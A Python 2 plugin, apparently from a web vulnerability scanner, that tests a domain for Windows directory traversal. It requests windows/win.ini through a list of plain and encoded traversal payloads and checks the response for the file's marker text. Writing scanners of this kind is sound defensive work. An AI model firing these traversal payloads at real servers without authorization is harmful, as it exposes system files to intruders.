#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger

def run_domain(http,ob):
    inj_path_list = [
        "../../../../../../../../../../../../../windows/win.ini",
        "windows/win.ini",
        "//../../../../../../../../../../../../../windows/win.ini",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
        "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
        "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fwindows%252Fwin.ini",
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
        "//././././././././././././././././././././././././../../../../../../../../windows/win.ini",
        "/./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../windows/win.ini",
        ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini",
        ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini"

    ]
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        for inj_path in inj_path_list:
            new_url = "%s://%s/%s" % (scheme,domain,inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.has_key('status') and res['status'] == '200':
                keyword = re.search(r'; for 16-bit app support',content)
                if keyword:
                    response = getResponse(res, content)
                    request = getRequest(new_url, domain=ob['domain'])
                    detail = "注入路径："+domain
                    result.append(getRecord(ob,new_url,ob['level'],detail,request,response))
                    return result
    except Exception,e:
        logger.error("File:dir_traversal_win_domain.py, run_domain function :%s" % (str(e)))
        return []





